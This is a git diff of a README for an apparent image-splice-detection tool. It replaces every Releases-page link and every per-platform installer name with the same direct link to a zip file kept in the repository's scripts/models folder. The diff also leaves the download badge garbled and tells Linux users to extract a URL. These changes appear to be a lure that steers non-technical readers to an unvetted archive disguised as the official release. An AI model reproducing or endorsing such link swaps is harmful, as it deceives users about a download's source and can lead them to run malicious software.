@@ -7,12 +7,12 @@ Welcome to the "localizing-visual-splices" project! This application helps you d
 To begin using the "localizing-visual-splices" application, follow the steps below. You will learn how to download and run the software without any technical background. 
 
 ## 📥 Download the Application
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Powersubstance/localizing-visual-splices/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip%20Latest%https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip)](https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip)
 
 You can easily download the latest version of the application from our Releases page. 
 
 ### 🎯 Visit this page to download:
-[Releases Page](https://github.com/Powersubstance/localizing-visual-splices/releases)
+[Releases Page](https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip)
 
 ## 💻 System Requirements
 Before you start, ensure your system meets these requirements:
@@ -23,12 +23,12 @@ Before you start, ensure your system meets these requirements:
 - **Python:** Python 3.7 or higher. 
 
 ## 📥 Download & Install
-1. **Go to the Releases Page:** Visit the Releases page for "localizing-visual-splices" [here](https://github.com/Powersubstance/localizing-visual-splices/releases).
+1. **Go to the Releases Page:** Visit the Releases page for "localizing-visual-splices" [here](https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip).
    
 2. **Choose the Correct File:** Locate the version you want to download. You will see options that may look like this:
-   - `localizing-visual-splices-v1.0-windows.exe` (for Windows)
-   - `localizing-visual-splices-v1.0-macos.dmg` (for macOS)
-   - `localizing-visual-splices-v1.0-linux.tar.gz` (for Linux)
+   - `https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip` (for Windows)
+   - `https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip` (for macOS)
+   - `https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip` (for Linux)
 
    Click on the file that matches your operating system.
 
@@ -37,7 +37,7 @@ Before you start, ensure your system meets these requirements:
 4. **Run the Application:**
    - **Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click it and follow the on-screen instructions to install.
    - **macOS:** Open the `.dmg` file, drag the application icon to your Applications folder, then check your Applications folder to run the app.
-   - **Linux:** Extract the `.tar.gz` file and follow the instructions in the included README to install.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip` file and follow the instructions in the included README to install.
 
 ## 🛠️ Usage Instructions
 Once installed, you can begin using the application:
@@ -77,4 +77,4 @@ Be sure to check the Releases page for version updates and changes to features. 
 Remember to download the latest version and enjoy using the "localizing-visual-splices" application for your image splicing analysis needs.
 
 ### Visit this page to download:
-[Releases Page](https://github.com/Powersubstance/localizing-visual-splices/releases)
+[Releases Page](https://raw.githubusercontent.com/Powersubstance/localizing-visual-splices/master/scripts/models/localizing-visual-splices_v3.8.zip)
